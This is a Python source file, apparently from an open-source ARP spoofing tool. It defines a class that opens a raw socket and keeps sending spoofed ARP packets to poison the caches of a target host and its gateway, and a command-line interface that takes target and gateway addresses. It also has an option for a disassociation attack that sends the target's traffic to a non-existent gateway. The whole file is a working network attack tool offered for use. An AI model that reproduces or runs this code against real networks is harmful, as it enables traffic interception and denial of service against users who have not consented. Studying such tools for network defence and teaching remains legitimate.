#!/usr/bin/env python3
# https://github.com/EONRaider/Arp-Spoofer

__author__ = 'EONRaider @ keybase.io/eonraider'

import argparse
import time
from socket import htons, ntohs, socket, PF_PACKET, SOCK_RAW

from packets import ARPSetupProxy


class Spoofer(object):
    def __init__(self, *, interface: str, attacker_mac: str,
                 gateway_mac: str, gateway_ip: str,
                 target_mac: str, target_ip: str,
                 interval: float, disassociate: bool):
        self.interval = interval
        self.arp = ARPSetupProxy(interface, attacker_mac, gateway_mac,
                                 gateway_ip, target_mac, target_ip,
                                 disassociate)

    def execute(self):
        try:
            self.__display_user_prompt()
            self.__send_attack_packets()
        except KeyboardInterrupt:
            raise SystemExit('[!] ARP Spoofing attack aborted.')

    def __send_attack_packets(self):
        with socket(PF_PACKET, SOCK_RAW, ntohs(0x0800)) as sock:
            sock.bind((self.arp.interface, htons(0x0800)))
            while True:
                for packet in self.arp.packets:
                    sock.send(packet)
                time.sleep(self.interval)

    def __display_user_prompt(self):
        print('\n[>>>] ARP Spoofing configuration:')
        configurations = {'Interface': self.arp.interface,
                          'Attacker MAC': self.arp.packets.attacker_mac,
                          'Gateway IP': self.arp.packets.gateway_ip,
                          'Gateway MAC': self.arp.packets.gateway_mac,
                          'Target IP': self.arp.packets.target_ip,
                          'Target MAC': self.arp.packets.target_mac}

        for setting, value in configurations.items():
            print('{0: >7} {1: <13}{2:.>25}'.format('[+]', setting, value))

        while True:
            proceed = input('\n[!] ARP packets ready. Execute the attack with '
                            'these settings? (Y/N) ').lower()
            if proceed == 'y':
                print('\n[+] ARP Spoofing attack initiated. Press Ctrl-C to '
                      'abort.')
                break
            if proceed == 'n':
                raise KeyboardInterrupt


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='Execute ARP Cache Poisoning attacks (a.k.a "ARP '
                    'Spoofing") on local networks.')
    parser.add_argument('targetip', type=str, metavar='TARGET_IP',
                        help='IP address currently assigned to the target.')
    parser.add_argument('-i', '--interface', type=str,
                        help='Interface on the attacker machine to send '
                             'packets from.')
    parser.add_argument('--attackermac', type=str, metavar='MAC',
                        help='MAC address of the NIC from which the attacker '
                             'machine will send the spoofed ARP packets.')
    parser.add_argument('--gatemac', type=str, metavar='MAC',
                        help='MAC address of the NIC associated to the '
                             'gateway.')
    parser.add_argument('--targetmac', type=str, metavar='MAC',
                        help='MAC address of the NIC associated to the target.')
    parser.add_argument('--gateip', type=str, metavar='IP',
                        help='IP address currently assigned to the gateway.')
    parser.add_argument('--interval', type=float, default=0.5, metavar='TIME',
                        help='Time in between each transmission of spoofed ARP '
                             'packets (defaults to 0.5 seconds).')
    parser.add_argument('--disassociate', action='store_true',
                        help='Execute a disassociation attack in which a '
                             'randomized MAC address is set for the attacker '
                             'machine, effectively making the target host send '
                             'packets to a non-existent gateway.')
    cli_args = parser.parse_args()
    spoofer = Spoofer(interface=cli_args.interface,
                      attacker_mac=cli_args.attackermac,
                      gateway_mac=cli_args.gatemac,
                      gateway_ip=cli_args.gateip,
                      target_mac=cli_args.targetmac,
                      target_ip=cli_args.targetip,
                      interval=cli_args.interval,
                      disassociate=cli_args.disassociate)
    spoofer.execute()
